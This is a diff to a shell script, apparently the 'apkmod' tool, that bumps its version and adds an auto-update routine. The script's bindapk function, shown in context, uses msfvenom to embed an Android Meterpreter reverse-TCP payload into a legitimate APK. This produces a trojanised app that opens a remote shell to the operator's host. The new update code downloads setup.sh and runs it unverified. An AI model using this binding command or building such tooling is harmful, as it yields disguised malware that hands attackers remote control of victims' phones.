@@ -7,7 +7,7 @@
 ########################################
 
 CWD=$(pwd)
-VERSION="1.0"
+VERSION="1.1"
 
 #colors
 cyan='\033[1;36m'                       
@@ -62,6 +62,10 @@ signapk() {
 	print_status "Signed to ${2}"
 }
 
+#########################
+# Bind payload with APK #
+#########################
+
 bindapk() {
 	print_status "Binding ${3}"
 	msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o ${4}
@@ -72,6 +76,9 @@ bindapk() {
 	print_status "Binded to ${4}"
 }
 
+#########################
+# Validate User's input #
+#########################
 
 validate_input() {
 	if [ "${1}" = "-b" ]; then
@@ -99,11 +106,42 @@ validate_input() {
 	fi
 }
 
+###############################
+# do automatic update check & #
+# ask for update if available #
+###############################
+
+update() {
+	temp=$(curl -L -s https://github.com/Hax4us/Apkmod/raw/master/apkmod.sh | grep -w VERSION=)
+	N_VERSION=$(echo ${temp} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
+	if [ "${1}" != "-u" ]; then
+		[ 1 -eq $(echo "${N_VERSION} != ${VERSION}" | bc -l) ] && print_status "Update is available, run [ apkmod -u ] for update" && exit 1
+	fi
+	if [ "${1}" = "-u" ]; then
+		cd && wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh && sh setup.sh
+	fi
+}
+
+##############
+#    MAIN    #
+##############
+
+# check for update only if net is ON
+wget -q --spider http://google.com
+if [ $? -eq 0 ]; then
+    update
+fi
+
 if [ "${1}" = "-h" -o "${1}" = "" ]; then
 	usage
 	exit 1
 elif [ "${1}" = "-v" ]; then
 	printf "${yellow}${VERSION}\n${reset}"
+elif [ "${1}" = "-u" ]; then
+	print_status "Updating ..."
+	update ${1}
+	print_status "Update complted"
+	exit
 fi
 
 if [ "${1}" = "-d" -o "${1}" = "-r" -o "${1}" = "-s" ]; then
